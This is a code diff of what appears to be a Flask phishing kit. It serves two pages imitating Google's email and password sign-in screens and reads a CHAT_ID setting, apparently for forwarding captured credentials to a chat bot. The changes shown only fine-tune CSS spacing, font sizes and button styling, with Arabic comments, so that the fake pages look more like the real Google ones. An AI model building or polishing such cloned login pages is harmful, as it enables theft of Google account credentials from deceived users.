@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: ضبط المسافة بين العناصر بشكل متناسق وثابت
+# الصفحة الأولى: فصل الحاويات بالكامل لعزل العناصر عن زر التالي
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -52,9 +52,10 @@ def step1():
             flex-direction: column; 
             justify-content: space-between; 
             align-items: center; 
-            padding: 12px 16px;
+            padding: 16px;
         }
         
+        /* حاوية المحتوى العلوي مستقلة تماماً */
         .login-container {
             width: 100%;
             max-width: 400px;
@@ -62,23 +63,22 @@ def step1():
             flex-direction: column;
             align-items: center;
             text-align: center;
-            margin-top: 2px;
         }
 
         .google-g {
             width: 36px;
             height: 36px;
-            margin-bottom: 4px;
+            margin-bottom: 6px;
         }
 
-        .title { font-size: 20px; font-weight: 400; color: #202124; margin-bottom: 3px; }
-        .subtitle { font-size: 12.5px; color: #5f6368; margin-bottom: 2px; line-height: 1.3; }
+        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 4px; }
+        .subtitle { font-size: 13px; color: #5f6368; margin-bottom: 4px; line-height: 1.4; }
         
         .info-link {
-            font-size: 12.5px;
+            font-size: 13px;
             color: #1a73e8;
             text-decoration: none;
-            margin-bottom: 10px;
+            margin-bottom: 16px;
             display: inline-block;
         }
         .info-link:hover { text-decoration: underline; }
@@ -87,7 +87,7 @@ def step1():
             color: #d93025; 
             font-size: 13px; 
             line-height: 20px; 
-            margin-bottom: 8px; 
+            margin-bottom: 12px; 
             width: 100%; 
             text-align: right; 
             background: #fce8e6; 
@@ -96,10 +96,10 @@ def step1():
             border: 1px solid #fad2cf; 
         }
 
-        .input-group { width: 100%; margin-bottom: 6px; }
+        .input-group { width: 100%; margin-bottom: 8px; }
         .input-group input {
             width: 100%;
-            padding: 12px 14px;
+            padding: 13px 14px;
             font-size: 15px;
             border: 1px solid #dadce0;
             border-radius: 8px;
@@ -107,7 +107,7 @@ def step1():
             color: #202124;
             background: #fff;
         }
-        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 11px 13px; }
+        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 13px; }
 
         .links-container {
             width: 100%;
@@ -115,7 +115,7 @@ def step1():
             flex-direction: column;
             align-items: flex-start;
             padding: 0 2px;
-            margin-top: 6px;
+            margin-top: 8px;
         }
         .links-container a {
             color: #1a73e8;
@@ -125,27 +125,28 @@ def step1():
         }
         .links-container a:hover { text-decoration: underline; }
 
-        /* ضبط المسافة لتكون متوازنة وبدون التأثير على زر التالي */
+        /* التحكم بمسافة "إنشاء حساب" بحرية تامة دون التأثير على أسفل الصفحة */
         .create-account-link {
-            margin-top: 35px; 
+            margin-top: 24px; 
         }
 
+        /* حاوية زر التالي السفلية معزولة تماماً في الأسفل */
         .footer-action {
             width: 100%;
             max-width: 400px;
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            padding-bottom: 20px;
+            padding-bottom: 12px;
         }
 
         .submit-btn {
             background: #1a73e8;
             color: white;
             border: none;
-            border-radius: 25px;
-            padding: 11px 28px;
-            font-size: 15px;
+            border-radius: 24px;
+            padding: 10px 26px;
+            font-size: 14px;
             font-weight: 500;
             cursor: pointer;
             box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
@@ -238,7 +239,7 @@ def step2():
             flex-direction: column; 
             justify-content: space-between; 
             align-items: center; 
-            padding: 12px 16px;
+            padding: 16px;
         }
         
         .login-container {
@@ -248,14 +249,13 @@ def step2():
             flex-direction: column;
             align-items: center;
             text-align: center;
-            margin-top: 5px;
         }
 
         .google-logo {
             font-size: 22px;
             font-weight: 500;
             color: #202124;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -269,16 +269,16 @@ def step2():
         .google-logo span span:nth-child(5) { color: #34A853; }
         .google-logo span span:nth-child(6) { color: #EA4335; }
 
-        .title { font-size: 20px; font-weight: 400; color: #202124; margin-bottom: 6px; }
+        .title { font-size: 22px; font-weight: 400; color: #202124; margin-bottom: 8px; }
         
         .user-chip {
             display: inline-flex;
             align-items: center;
-            padding: 3px 10px 3px 3px;
+            padding: 4px 12px 4px 4px;
             border: 1px solid #dadce0;
             border-radius: 100px;
-            margin-bottom: 14px;
-            font-size: 12.5px;
+            margin-bottom: 16px;
+            font-size: 13px;
             color: #3c4043;
             gap: 6px;
             background: #fff;
@@ -289,7 +289,7 @@ def step2():
             color: #d93025; 
             font-size: 13px; 
             line-height: 20px; 
-            margin-bottom: 8px; 
+            margin-bottom: 12px; 
             width: 100%; 
             text-align: right; 
             background: #fce8e6; 
@@ -301,7 +301,7 @@ def step2():
         .input-group { width: 100%; margin-bottom: 10px; }
         .input-group input {
             width: 100%;
-            padding: 12px 14px;
+            padding: 13px 14px;
             font-size: 15px;
             border: 1px solid #dadce0;
             border-radius: 8px;
@@ -309,7 +309,7 @@ def step2():
             color: #202124;
             background: #fff;
         }
-        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 11px 13px; }
+        .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 12px 13px; }
 
         .footer-action {
             width: 100%;
@@ -317,16 +317,16 @@ def step2():
             display: flex;
             justify-content: flex-end;
             align-items: center;
-            padding-bottom: 20px;
+            padding-bottom: 12px;
         }
 
         .submit-btn {
             background: #1a73e8;
             color: white;
             border: none;
-            border-radius: 25px;
-            padding: 11px 28px;
-            font-size: 15px;
+            border-radius: 24px;
+            padding: 10px 26px;
+            font-size: 14px;
             font-weight: 500;
             cursor: pointer;
             box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
